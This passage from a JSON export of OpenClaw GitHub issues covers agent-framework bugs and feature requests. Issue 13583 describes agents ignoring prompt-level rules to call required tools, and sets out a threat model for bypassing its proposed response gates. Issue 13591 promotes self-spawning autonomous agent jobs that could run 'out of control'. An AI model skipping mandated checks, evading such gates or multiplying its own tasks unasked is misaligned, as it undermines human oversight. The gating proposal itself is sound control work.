Implementation\n\n1. **Detect CSP on attach**\n   ```javascript\n   // In content script\n   const csp = document.querySelector(\"meta[http-equiv='Content-Security-Policy']\");\n   if (csp && csp.content.includes(\"script-src\")) {\n     sendWarning(\"CSP detected, extension may not work\");\n   }\n   ```\n\n2. **Use Chrome DevTools Protocol**\n   - Extension connects via CDP instead of content scripts\n   - Bypasses CSP restrictions (works at browser level)\n   - More reliable but requires different architecture\n\n3. **Graceful degradation**\n   ```javascript\n   if (profile === \"chrome\" && cspDetected) {\n     logger.warn(\"CSP blocks extension, falling back to profile=openclaw\");\n     return automateWithOpenClaw(request);\n   }\n   ```\n\n## Workaround (for users now)\n\nUse isolated OpenClaw browser instead of extension relay:\n\n```typescript\nbrowser.action({\n  action: \"open\",\n  profile: \"openclaw\",  // NOT \"chrome\"\n  targetUrl: \"https://music.apple.com\"\n})\n```\n\nThis works but loses the benefit of using existing logged-in Chrome tabs.\n\n## Acceptance Criteria\n\n- [ ] Extension detects CSP restrictions on tab attach\n- [ ] Clear error/warning shown when CSP blocks injection\n- [ ] Badge accurately reflects attachment state (not \"ON\" when blocked)\n- [ ] Documentation explains CSP limitations\n- [ ] Fallback mechanism proposed or implemented\n- [ ] List of known incompatible sites documented\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13600",
      "createdAt": "2026-02-10T18:55:12Z",
      "updatedAt": "2026-02-10T18:55:12Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      }
    },
    {
      "number": 13599,
      "title": "Add detailed node pairing setup guide with examples",
      "body": "## Overview\n\nRequest step-by-step node pairing documentation with real-world examples. Current documentation is sparse on this topic, causing setup confusion.\n\n## Requested Coverage\n\n### Conceptual Foundation\n- What nodes are and their purpose\n- When to use node pairing\n- Architecture overview (gateway ↔ node relationship)\n\n### Setup Instructions\n- Setting up gateway URL and token\n- Using environment variables vs CLI flags\n- Node configuration options\n- Verification steps\n\n### Troubleshooting\n- Authentication errors and how to resolve them\n- Connection issues\n- Firewall and network configuration\n- Common setup mistakes\n\n### Browser Proxy Feature\n- What the browser proxy feature does\n- How to configure and use it\n- Use cases and benefits\n\n### Real-World Examples\n- Mac as a node\n- Remote Linux box as a node\n- Multiple node setup\n- Security considerations for each scenario\n\n## Why This Matters\n\nNode pairing is a powerful feature but currently difficult to set up. Better documentation will:\n- Reduce setup confusion and support requests\n- Improve user experience for this advanced feature\n- Enable more users to leverage distributed capabilities\n- Provide clear examples they can follow",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13599",
      "createdAt": "2026-02-10T18:54:37Z",
      "updatedAt": "2026-02-10T18:54:37Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13598,
      "title": "Add cron troubleshooting playbook to docs",
      "body": "## Overview\n\nRequest a comprehensive troubleshooting guide for OpenClaw cron issues. Reference: issue #13582.\n\n## Requested Coverage\n\n### Verification Commands\n- How to verify jobs are scheduled: `openclaw cron list`\n- How to check execution history: `openclaw cron runs`\n- How to view job details and output\n\n### Troubleshooting Steps\n- What to do when jobs don't fire\n- How to check gateway status and polling\n- How to inspect logs for cron-related errors\n- Wake events and their role in cron execution\n\n### System Cron Fallback\n- Document the system cron fallback approach (as referenced in #13582)\n- When and how to use it\n\n### Common Pitfalls\n- Timezone confusion and configuration\n- Gateway not polling or offline\n- Job scheduling syntax errors\n- Permission issues\n- Resource constraints\n\n## Why This Matters\n\nCron issues are a common source of confusion. A dedicated troubleshooting playbook will:\n- Reduce support burden\n- Empower users to diagnose and fix issues themselves\n- Improve user experience\n- Document known issues and workarounds\n\nRelated: #13582",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13598",
      "createdAt": "2026-02-10T18:54:36Z",
      "updatedAt": "2026-02-10T18:54:36Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13597,
      "title": "Add comprehensive AWS deployment guide (EC2, ECS, Lambda)",
      "body": "## Overview\n\nRequest documentation for deploying OpenClaw on AWS infrastructure. Current documentation lacks cloud deployment specifics, which would help with adoption and reduce support burden.\n\n## Requested Coverage\n\n### EC2 Deployment\n- EC2 instance setup and configuration\n- systemd service configuration\n- Security groups and firewall rules\n- IAM roles and permissions\n\n### ECS Deployment\n- Task definitions\n- Networking configuration\n- Service setup\n\n### Lambda Deployment\n- If applicable, document Lambda deployment options\n\n### Production Best Practices\n- Logging configuration and monitoring\n- Backup strategies\n- Troubleshooting common issues (like cron scheduler problems on EC2)\n- Performance tuning\n- Security hardening\n\n## Why This Matters\n\nBetter cloud deployment documentation will:\n- Reduce support burden for common deployment questions\n- Improve user experience for production deployments\n- Help users avoid common pitfalls\n- Accelerate adoption by making cloud deployment straightforward",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13597",
      "createdAt": "2026-02-10T18:54:35Z",
      "updatedAt": "2026-02-10T18:54:35Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13596,
      "title": "Improve node pairing authentication flow and error messages",
      "body": "## Problem\n\nThe node pairing process has significant UX issues that make it confusing and error-prone:\n\n1. **Missing `openclaw node pair` command** — users expect a CLI command for pairing\n2. **Confusing environment variables** — `OPENCLAW_GATEWAY_TOKEN` vs gateway URL vs pairing codes\n3. **Unclear error messages** — authentication failures don't explain what's wrong\n4. **No guided setup** — users have to piece together the process from docs\n\n## Why This Matters\n\n- **First impression matters** — node setup is often the first \"real\" OpenClaw task\n- **Support burden** — confusing flows generate support requests\n- **Trust** — authentication errors without clear messages make users nervous\n- **Adoption** — bad pairing UX prevents users from unlocking node features\n\n## Current Experience\n\n### What users try:\n```bash\n$ openclaw node pair\nbash: openclaw: command not found (or no such subcommand)\n```\n\n### What users have to do:\n1. Find the gateway URL somehow\n2. Set `OPENCLAW_GATEWAY_TOKEN` environment variable\n3. Hope the token is correct\n4. Get cryptic error: `Authentication failed` (no hint about what to fix)\n\n### Authentication failure example:\n```\nError: Failed to connect to gateway\nAuthentication failed\n```\n\nNo indication of:\n- Is the token wrong?\n- Is the gateway URL incorrect?\n- Is the gateway even running?\n- Should I use a pairing code instead?\n\n## Proposed Solution\n\n### 1. Add `openclaw node pair` Command\n\n```bash\n# Interactive pairing\n$ openclaw node pair\nEnter gateway URL: https://gateway.example.com\nEnter pairing code (or press Enter to generate): \nPairing code: ABC-123-DEF\nWaiting for approval...\n✓ Paired successfully as node 'macbook-pro'\nToken saved to ~/.openclaw/node.token\n\n# Non-interactive with token\n$ openclaw node pair --token <token> --gateway <url>\n\n# With pairing code\n$ openclaw node pair --code ABC-123-DEF --gateway <url>\n```\n\n### 2. Improve Error Messages\n\n```bash\n# Instead of:\nError: Authentication failed\n\n# Show:\nError: Authentication failed\nReason: Invalid or expired token\n\nTroubleshooting:\n• Check OPENCLAW_GATEWAY_TOKEN is set correctly\n• Verify gateway URL: https://gateway.example.com\n• Try regenerating a pairing code: openclaw node pair\n• Check gateway logs: openclaw gateway logs | grep pairing\n```\n\n### 3. Guided Setup Wizard\n\n```bash\n$ openclaw node setup\n\n🔗 OpenClaw Node Setup\n\nThis will connect this device to your OpenClaw gateway.\n\n1. Gateway URL\n   Enter your gateway address (e.g., https://gateway.example.com)\n   URL: _\n\n2. Authentication Method\n   [ ] Pairing code (recommended for first-time setup)\n   [ ] Token (for automated setups)\n   \n3. Node Name\n   What should we call this node? (default: macbook-pro)\n   Name: _\n\n[Continue]  [Cancel]\n```\n\n### 4. Better Environment Variable Documentation\n\n```bash\n# Show current config\n$ openclaw node status\nNode Status: Not Paired\nGateway URL: (not set)\nToken: (not set)\n\nTo pair this node:\n  openclaw node pair\n\nOr set manually:\n  export OPENCLAW_GATEWAY_URL=https://gateway.example.com\n  export OPENCLAW_GATEWAY_TOKEN=<your-token>\n```\n\n## Implementation Approach\n\n1. **Add node pair subcommand** to CLI\n2. **Enhance auth error responses** from gateway with specific failure reasons\n3. **Add pairing code flow** if not already present\n4. **Create setup wizard** with interactive prompts\n5. **Add `node status`** to show current config state\n\n## Acceptance Criteria\n\n- [ ] `openclaw node pair` command exists and works\n- [ ] Authentication errors explain what went wrong\n- [ ] Setup wizard guides users through pairing\n- [ ] `openclaw node status` shows connection state\n- [ ] Documentation updated with clear pairing steps\n- [ ] Error messages include troubleshooting hints\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13596",
      "createdAt": "2026-02-10T18:54:28Z",
      "updatedAt": "2026-02-10T18:54:28Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "onboarding",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13591,
      "title": "AI Agent Chrome Job Inception Strategy - Autonomous Agent with Self-Spawning Jobs",
      "body": "Interesting concept from a YouTube video about building autonomous AI agents that can self-discover tasks and spawn new jobs.\\n\\n## Concept Summary\\n\\nThe \"Chrome Job Inception Strategy\" enables AI agents to:\\n1. Run scheduled jobs (cron jobs)\\n2. Discover interesting content during execution\\n3. **Autonomously spawn new jobs** based on discoveries\\n4. Create chains of jobs that can spawn more jobs\\n\\n## Example Workflow\\n\\nFrom the video example:\\n- Agent visits Hacker News\\n- Finds interesting post (e.g., \"Total Recall\" memory system)\\n- Creates a new cron job to investigate further\\n- Goes to GitHub repo\\n- Comments on Hacker News post\\n- Finds author's X handle and spawns another job to engage on X\\n\\n**Core goal:** Networking & Growth\\n\\n## Why This Is Interesting\\n\\n- Agents become truly autonomous, not just reactive\\n- Can discover opportunities the developer never anticipated\\n- Creates a \"three-form\" structure that fans out over time\\n- Hand off creative discovery to the agent\\n\\n## Potential Implementation Ideas\\n\\n- [ ] Explore spawning mechanisms in OpenClaw\\n- [ ] Add \"spawn evaluation\" to cron job lifecycle\\n- [ ] Create memory/decision system for \"what's worth spawning\"\\n- [ ] Test with a simple goal-based experiment\\n\\n## Notes from Video\\n\\nFrom the transcript, the creator mentioned:\\n- Started testing just \"a day or so ago\"\\n- Working \"pretty good so far\"\\n- Generates \"more interesting things that are not really scheduled by me\"\\n- Could get \"very big\" and \"a bit out of control\"\\n- Promises a \"10-day review\" video coming soon\\n\\n---\\n\\nTranskript från video: https://youtu.be/0Y0jbaoREHc\\n\\nLabel: enhancement",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13591",
      "createdAt": "2026-02-10T18:52:45Z",
      "updatedAt": "2026-02-10T18:54:08Z",
      "author": "rasanderoland",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13595,
      "title": "Config patches don't take effect without hard restart (tool configurations)",
      "body": "## Problem\n\nChanging tool configurations via `config.patch` doesn't take effect without killing and restarting the gateway. SIGUSR1 is supposed to trigger a config reload, but tool-specific configurations (like web search provider) aren't being properly reloaded.\n\n## Why This Matters\n\n- **Poor developer experience** — config changes require full restart\n- **Downtime** — killing gateway interrupts all active sessions\n- **SIGUSR1 is misleading** — users expect it to work for all configs\n- **Production issues** — can't do graceful config updates\n\n## Reproduction Steps\n\n1. Start gateway with default config (Brave web search)\n2. Verify web search is using Brave:\n   ```bash\n   openclaw config --json | jq .webSearch\n   ```\n3. Update config to use Perplexity:\n   ```bash\n   echo '{\n     \"webSearch\": {\n       \"provider\": \"perplexity\"\n     }\n   }' > config.patch\n   ```\n4. Send SIGUSR1 to gateway:\n   ```bash\n   kill -USR1 $(pgrep -f 'openclaw.*gateway')\n   ```\n5. Check config again — it shows updated config:\n   ```bash\n   openclaw config --json | jq .webSearch\n   ```\n6. **But web searches still use Brave!** Tool config wasn't reloaded.\n7. Kill and restart gateway:\n   ```bash\n   pkill -f 'openclaw.*gateway'\n   openclaw gateway start --background\n   ```\n8. Now web searches use Perplexity correctly.\n\n## Expected Behavior\n\nAfter SIGUSR1:\n- Config file is re-read ✅ (this works)\n- Tool instances are re-initialized with new config ❌ (this doesn't work)\n- Active sessions continue uninterrupted ✅\n- New requests use updated tool configurations ❌\n\n## Current Behavior\n\n- Config object is updated in memory\n- Tool instances retain old configuration\n- Requires full gateway restart to take effect\n\n## Implementation Approach\n\nLikely need to:\n\n1. **Identify tool initialization points** — where web search, browser, etc. are instantiated\n2. **Add reload hooks** — allow tools to reinitialize on config change\n3. **Detect config changes** — compare old vs new config to minimize disruption\n4. **Graceful handoff** — finish in-flight requests with old config, new requests use new config\n\n```typescript\n// Pseudo-code\nclass ToolManager {\n  async reloadConfig(newConfig: Config) {\n    for (const [name, tool] of this.tools) {\n      if (tool.reload) {\n        await tool.reload(newConfig);\n      } else {\n        // Re-instantiate tools without reload hook\n        this.tools.set(name, createTool(name, newConfig));\n      }\n    }\n  }\n}\n```\n\n## Affected Tools\n\n- Web search (Brave/Perplexity)\n- Browser profiles\n- Message channels (potentially)\n- Any tool with configuration in config.patch\n\n## Acceptance Criteria\n\n- [ ] SIGUSR1 reloads tool configurations\n- [ ] Web search provider switches without restart\n- [ ] Browser profile changes take effect\n- [ ] In-flight requests complete gracefully\n- [ ] Logs indicate which tools were reloaded\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13595",
      "createdAt": "2026-02-10T18:54:02Z",
      "updatedAt": "2026-02-10T18:54:02Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13593,
      "title": "Add logging and warnings for cron job execution failures",
      "body": "## Problem\n\nThe cron scheduler currently suffers from silent failures where `nextRunAtMs` advances without actual job execution. When a scheduled job fails to run, there's no indication in logs or status output, making it difficult to detect and diagnose issues.\n\n**Related:** This is a follow-up to the root cause fix in issue #13582 (the cron scheduler bug we filed today).\n\n## Why This Matters\n\n- **Silent failures are dangerous** — jobs appear healthy when they're not running\n- **Debugging is difficult** — no logs means no way to investigate what went wrong\n- **Trust issues** — users can't rely on cron without visibility into execution state\n- **Production readiness** — monitoring systems need health signals\n\n## Current Behavior\n\nWhen a cron job fails to execute:\n- `nextRunAtMs` updates as if execution succeeded\n- No warning or error is logged\n- `openclaw cron list` shows job as healthy\n- User has no indication anything went wrong\n\n## Proposed Solution\n\n### 1. Execution Logging\n- Log every job execution attempt (success/failure/skipped)\n- Include timestamps, job ID, execution duration\n- Separate log level for skipped executions (WARN)\n\n### 2. Health Check Endpoint\n- Add `/health/cron` endpoint that reports:\n  - Jobs that haven't run when expected\n  - Jobs with consecutive failures\n  - Overall scheduler health status\n- Compatible with AWS ALB and K8s probes\n\n### 3. Status Warnings\n- `openclaw cron list` should flag jobs that:\n  - Haven't executed in >2x their interval\n  - Have failed last N runs\n  - Are overdue for execution\n\n## Implementation Approach\n\n```typescript\n// Add execution tracking\ninterface CronExecution {\n  jobId: string;\n  scheduledAt: number;\n  executedAt: number | null;\n  status: 'success' | 'failed' | 'skipped';\n  error?: string;\n}\n\n// Log on every run\nlogger.warn({\n  event: 'cron.execution.skipped',\n  jobId,\n  scheduledAt,\n  reason: 'executor_busy'\n});\n```\n\n## Acceptance Criteria\n\n- [ ] Every cron execution attempt is logged\n- [ ] Skipped executions generate warnings\n- [ ] Health endpoint returns 200/503 based on cron state\n- [ ] CLI flags jobs with execution issues\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13593",
      "createdAt": "2026-02-10T18:53:42Z",
      "updatedAt": "2026-02-10T18:53:42Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13583,
      "title": "[Feature] Pre-response enforcement hooks (hard gates) for mandatory tool-call / policy rules",
      "body": "## Summary\nOpenClaw currently treats \"must call tool X before responding\" rules as *soft* instructions embedded in prompts. In high-stakes workflows (quant/finance, security, operations), soft rules are not acceptable: the agent must be **mechanically prevented** from emitting a final answer until required checks/tools run and pass.\n\nRequest: add a **pre-response enforcement layer** that can gate final output delivery on validator results and/or mandatory tool calls.\n\n## Problem / Motivation\n\nIn OpenClaw, many teams encode critical process constraints as text:\n- \"If confidence < 95%, consult external reviewer tool\"\n- \"For trading logic changes, run consensus script before proposing changes\"\n- \"For security decisions, call threat-model tool\"\n\nIn practice, LLMs violate these under realistic conditions:\n- **RLHF bias** toward being helpful quickly (answers without checking)\n- **Self-assessed confidence is noisy** — the model cannot reliably judge when it is wrong\n- **Context dilution** — rules lose attention weight as conversations grow\n- **Tool latency aversion** — learned optimization toward skipping slow tool calls\n\n**Evidence:** In our deployment (quant finance, 3-agent architecture), a \"must consult external models when confidence < 95%\" rule was violated repeatedly despite appearing in SOUL.md, AGENTS.md, and per-response checklists. A 3-model deep analysis (Claude Opus 4.6 + Gemini 3 Pro + GPT-5.2) concluded unanimously that text-based enforcement is \"vibes-based governance\" — probabilistically defeasible by design.\n\n## Proposed Design: Two-Phase Protocol + Validators\n\n### Phase 1: Pre-response planning (tool-only)\n- Model output restricted to structured envelope (JSON) containing planned tool calls, domain tags, and which rules apply\n- No user-facing content allowed\n\n### System runs:\n- Configured tool calls from Phase 1\n- Configured validators over the plan and results\n\n### Phase 2: Response\n- Only enabled if validators pass\n- Final message generated, referencing tool results\n\n### If validation fails:\n- Re-plan (limited retries) or return deterministic status message\n\n## Validators\n\nPlugin interface + config for pre-response validators:\n1. **Mandatory tool-call rules** — \"If domain=security, require consensus script\"\n2. **Data freshness** — \"If quote mentioned, require data < N minutes old\"\n3. **Format constraints** — \"If sending orders, must output strict schema\"\n4. **Forbidden content** — \"Cannot mention internal tool names to user\"\n\n## Configuration\n\n\n\nPer-agent / per-skill overrides for different gate levels.\n\n\n\n## Configuration\n\n```yaml\nresponseGate:\n  enabled: true\n  mode: two_phase\n  maxRetries: 2\n  validators:\n    - type: require_tools\n      when:\n        any:\n          - tag: trading_logic\n      require:\n        - tool: exec\n          args:\n            command: \"python3 scripts/consensus.py deep ...\"\n```\n\nPer-agent / per-skill overrides for different gate levels.\n\n## Threat Model\n1. Tool failure/timeouts → configurable fallback (refuse, degrade, request human approval)\n2. Adversarial bypass → strict schema separation between planning and response\n3. Model smuggling answers into planning fields → Phase 1 schema validation\n4. Infinite retry loops → hard maxRetries cap\n\n## Auditing\n- Log which validators triggered, tool calls executed, pass/fail, timestamps\n- Enable \"prove compliance\" for audit trails\n\n## Minimal Viable Implementation\n1. Phase 1 schema: tool_calls[], tags[], needs[]\n2. One validator: require_tools (covers 80% of use cases)\n3. One UI/log line: \"Response gated by policy XYZ\"\n\n**Acceptance test:** A reproducible scenario where the model will violate prompt rules today, but cannot after gating.\n\n## Framing\nThis is **policy-as-code for agent workflows**. It enables regulated environments (finance, healthcare, legal), professional reliability guarantees, and auditable compliance trails.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13583",
      "createdAt": "2026-02-10T18:45:52Z",
      "updatedAt": "2026-02-10T18:52:29Z",
      "author": "JamieMolty",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 5452,
      "title": "[Feature]: change default prompt queries",
      "body": "Internal review\nTask: rewrite an existing feature request into a specific GitHub issue template.\nAction: preserve intent, remove redundancy, keep it neutral and concise.\n\n⸻\n\nSummary\n\nClawdbot currently uses default prompts that appear to be hardcoded or implicitly defined in the codebase. This makes changing bot behavior difficult, as prompt updates require source code modifications and redeployment. There is no clear, supported way to configure or override the default prompts at runtime.\n\n⸻\n\nProposed solution\n\nAdd first-class support for configuring default bot prompts.\n\nClawdbot should allow:\n\t•\tdefining a global default prompt via configuration (file, env vars, or startup options),\n\t•\toptionally overriding the default prompt per bot or agent,\n\t•\ta clear precedence order (e.g. runtime override → bot/agent → global default),\n\t•\tkeeping existing behavior unchanged if no configuration is provided.\n\nPrompt configuration should not require editing source code.\n\n⸻\n\nAlternatives considered\n\t•\tModifying the default prompt directly in the source code.\n\t•\tDuplicating prompt logic in each bot or agent definition.\n\t•\tInjecting prompts manually at runtime through custom wrappers.\n\nThese approaches work but are error-prone, harder to maintain, and do not scale well.\n\n⸻\n\nAdditional context\n\nThis feature would improve separation of configuration and logic, simplify prompt tuning across environments (dev/test/prod), and increase transparency of the effective prompt used by Clawdbot at runtime.",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5452",
      "createdAt": "2026-01-31T14:13:10Z",
      "updatedAt": "2026-02-10T18:51:25Z",
      "author": "voytas75",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3829858293,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5452#issuecomment-3829858293",
          "createdAt": "2026-02-01T00:34:58Z",
          "updatedAt": "2026-02-01T00:34:58Z",
          "author": "sebslight",
          "body": "OpenClaw Maintainer Triage // Issue Closure\n\nHi — this is a joint maintainer effort to keep the repo moving. We’re currently seeing ~30 new issues per hour, and we can’t review every future request without slowing down critical stabilization work. This issue is unlikely to be considered in the near term, so we’re closing it to keep the pipeline moving while we focus on stability.\n\nWe’re very sorry this is happening, but we won’t be able to look at the comments on this issue.\n\nWant to make your request stand out? Submit a PR and report to #pr-thunderdome-dangerzone on Discord — READ THE TOPIC. Give us a clear briefing: what it fixes, who it helps, and why it’s worth shipping.\n\nThanks for understanding and for contributing.\n\n![](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXFramtnZWo1ZWM4YmYzcG1zcXE1NWV1eTl3MDZodnk4aWhvM2tqbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RWUqVYucDBD4A/giphy.gif)\n"
        },
        {
          "id": 3880069290,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5452#issuecomment-3880069290",
          "createdAt": "2026-02-10T18:51:25Z",
          "updatedAt": "2026-02-10T18:51:25Z",
          "author": "navsteruk",
          "body": "Hi OC Team,\n\nFirstly props to creating this incredible app.\n\nWe would be very grateful for the implementation of a configurable system prompt for the following:\n\nUse case: \nRunning persistent agent instances with specialized roles (infra, secops) rather than generic \"personal assistant\" framing. The hardcoded identity string creates behavioural drift when workspace files define something different.\n\nWhat we're seeing:\nAfter context resets, agents default back to PA patterns (permission-seeking \"Can I...?\" vs recommendation-making \"Here's what I found, recommend X\")\nRole definitions in SOUL.md and AGENTS.md fight uphill against the base prompt\nMultiple correction cycles needed to maintain intended behaviour patterns\n\nSuggested approach: \nConfig option like agents.defaults.identityPrefix or agents.list[].identity.systemPrompt that gets injected before workspace files, with sensible defaults for backward compatibility.\n\nThis would support diverse deployment patterns (specialized roles, team coordination, governance-aligned setups) and aligns with AI governance frameworks (ISO 42001) where agent identity and role need to be explicitly defined and auditable.\n\nHappy to test any implementation.\n\nThanks for consideration 👍 "
        }
      ]
    },
    {
      "number": 13589,
      "title": "Control UI: Agent tile layout — show name, full UUID, and channel binding",
      "body": "## Current Behavior\n\nThe agent tile cards in the Control UI show:\n- **Row 1:** Agent name + short UUID (e.g. `Book Editor 5bed5a64`)\n- **Row 2:** Agent ID / binding label (e.g. `book-editor`)\n- **Row 3:** `UUID: <full-uuid>`\n- **Row 4:** System prompt preview\n- **Row 5:** Model + message count\n\nThe **channel binding** (e.g. which Discord channel the agent is bound to) is not shown in the tile view or at the top of the Agent Details page.\n\n## Requested Changes\n\n### Tile view\n1. **Row 1:** Agent name only (drop the short UUID — it's not useful)\n2. **Row 2:** Full UUID\n3. **Row 3:** Channel binding (e.g. `discord-1470069150192767159` or a human-readable channel name)\n4. Remaining rows: system prompt preview, model, etc.\n\n### Agent Details page\n- Show the channel binding at the top of the page (currently missing)\n\n## Why\n- The short UUID fragment adds noise without being useful (can't copy/use it)\n- Channel binding is critical info — knowing which channel an agent is connected to should be visible at a glance\n- Full UUID is more useful than the truncated version\n\n## Screenshot\nSee attached — the `Book Editor` tile shows no channel info, and the short UUID next to the name is visual clutter.\n\n---\n_Filed from agent workspace_",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13589",
      "createdAt": "2026-02-10T18:48:54Z",
      "updatedAt": "2026-02-10T18:51:23Z",
      "author": "coolmanns",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "web-ui",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880069070,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13589#issuecomment-3880069070",
          "createdAt": "2026-02-10T18:51:22Z",
          "updatedAt": "2026-02-10T18:51:22Z",
          "author": "coolmanns",
          "body": "Filed in error — this is about a custom UI, not the OpenClaw control UI. Closing."
        }
      ]
    },
    {
      "number": 13588,
      "title": "TUI: Background exec completion notifications corrupt streaming responses",
      "body": "## Description\n\nWhen background exec processes complete during a streaming response, the `System:[...] Exec completed` notifications get interleaved with the response stream, breaking TUI rendering.\n\n## Reproduction\n\n1. In webchat TUI, trigger a long-running exec that backgrounds\n2. Have the agent continue responding while exec completes\n3. Observe `System: Exec completed` messages appearing mid-response\n4. TUI output becomes corrupted/incomplete\n\n## Expected\n\nBackground exec notifications should queue and display after response completes, or be clearly separated from agent output.\n\n## Environment\n\n- OpenClaw 2026.2.9\n- Windows 10\n- Webchat TUI\n\n## Related\n\nAlso seeing token counter display bug (shows 200k/200k 100% when actual usage is ~67%) - likely related TUI state management issue.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13588",
      "createdAt": "2026-02-10T18:48:23Z",
      "updatedAt": "2026-02-10T18:48:23Z",
      "author": "rbreaker6000",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "web-ui",
          "tui",
          "websocket"
        ]
      }
    },
    {
      "number": 13587,
      "title": "Feature Request: Native Cross-Session Prompt Logging",
      "body": "## Summary\nAdd built-in prompt logging at the gateway level to automatically capture all user inputs across sessions and Control UI clients.\n\n## Current State\nManual implementation: agents manually write prompts to `memory/user-prompts-YYYY-MM-DD.md` files. This works but requires agent awareness and isn't available to all users.\n\n## Proposed Feature\n**Automatic prompt logging** that:\n- Logs all user prompts from any Control UI client (webchat, Telegram, Discord, etc.)\n- Persists to `memory/user-prompts-YYYY-MM-DD.md` (or configurable path)\n- Includes: timestamp, channel, prompt text, optional response summary\n- Searchable across sessions (enables recall of \"lost\" conversations)\n- Gateway-level implementation (no agent intervention required)\n\n## Benefits\n1. **Context continuity** - Never lose track of past requests\n2. **Cross-session search** - Find conversations regardless of where they happened\n3. **Audit trail** - Complete record of user interactions\n4. **Memory assist** - Help agents recall topics from previous sessions\n\n## Implementation Options\n**Option A: Gateway-level logging**\n- Log at message ingress before routing to agent\n- Pros: Works for all sessions automatically\n- Cons: No semantic context from agent\n\n**Option B: Agent-level hook**\n- Provide hook/callback for agents to log\n- Pros: Agents can add context/summaries\n- Cons: Requires agent implementation\n\n**Option C: Hybrid**\n- Gateway logs raw prompts automatically\n- Agents can optionally enhance with summaries\n\n## Configuration Suggestions\n```yaml\npromptLogging:\n  enabled: true\n  path: \"memory/user-prompts-{date}.md\"\n  format: \"markdown\" # or json, jsonl\n  includeChannel: true\n  includeTimestamp: true\n  retentionDays: 90 # optional auto-cleanup\n```\n\n## Privacy Considerations\n- Add opt-out option for sensitive deployments\n- Consider filtering/redacting sensitive data\n- Document data retention policies\n\n## Related\n- Manual implementation working since 2026-02-10\n- Complements existing transcript logging (`.jsonl` files)\n- Related to #10599 (ChatGPT-like session improvements)\n\nWould love feedback on preferred approach and configuration options!",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13587",
      "createdAt": "2026-02-10T18:47:49Z",
      "updatedAt": "2026-02-10T18:47:49Z",
      "author": "Annaxiebot",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "discord"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 13582,
      "title": "Cron scheduler fails to execute jobs despite gateway running",
